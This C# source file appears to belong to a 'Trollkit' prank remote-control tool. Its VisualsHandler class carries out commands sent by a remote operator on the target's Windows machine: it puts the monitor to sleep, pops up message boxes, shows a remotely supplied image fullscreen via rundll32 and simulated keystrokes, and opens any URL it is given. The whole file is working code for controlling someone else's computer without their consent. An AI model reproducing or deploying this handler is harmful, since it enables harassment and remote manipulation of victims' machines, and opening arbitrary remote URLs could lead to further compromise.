using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Forms;
using Trollkit_Library.Models;
using Trollkit_Library.Modules;

namespace Trollkit_Client.Modules.CommandHandlers
{
	public class VisualsHandler : ICommandHandler
	{
		private const int SC_MONITORPOWER = 0xF170;
		private const int WM_SYSCOMMAND = 0x0112;

		public void HandleCommand(TransferCommandObject obj)
		{
			switch (obj.Command)
			{
				case "BlackScreen":
					MonitorSleep();
					break;
				case "TextBox":
					TextBox(obj.Value);
					break;
				case "ShowImage":
					ShowImage(obj.Value);
					Thread.Sleep(1000); //wait for the other program to display and get focus
					Keyboard keyboard = new Keyboard();
					keyboard.Send(Keyboard.ScanCodeShort.F11);
					break;
				case "OpenSite":
					OpenSite(obj.Value);
					break;
				case "SetBackground":
					
					break;
			}
		}

		private void MonitorSleep()
		{
			SendMessageW(GetHandle(), WM_SYSCOMMAND, (IntPtr)SC_MONITORPOWER, (IntPtr)2);
		}

		[DllImport("user32.dll")]
		public static extern IntPtr SendMessageW(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam);

		private static IntPtr GetHandle()
		{
			return Process.GetCurrentProcess().MainWindowHandle;
		}

		private void TextBox(string textToDisplay)
		{
			System.Windows.Forms.MessageBox.Show(textToDisplay);
		}

		private void ShowImage(string base64Image)
		{
			byte[] bytes = Convert.FromBase64String(base64Image);

			var tempFileName = Path.GetTempFileName();
			File.WriteAllBytes(tempFileName, bytes);

			string path = Environment.GetFolderPath(
				Environment.SpecialFolder.ProgramFiles);

			var psi = new ProcessStartInfo(
				"rundll32.exe",
				String.Format(
					"\"{0}{1}\", ImageView_Fullscreen {2}",
					Environment.Is64BitOperatingSystem ?
						path.Replace(" (x86)", "") :
						path
						,
					@"\Windows Photo Viewer\PhotoViewer.dll",
					tempFileName)
				);

			psi.UseShellExecute = false;

			var viewer = Process.Start(psi);
			viewer.EnableRaisingEvents = true;
			viewer.Exited += (o, args) =>
			{
				File.Delete(tempFileName);
			};

			Keyboard keyboard = new Keyboard();
			keyboard.Send(Keyboard.ScanCodeShort.LWIN);
		}

		private void OpenSite(string url)
		{
			Process.Start(url);
		}
	}
}
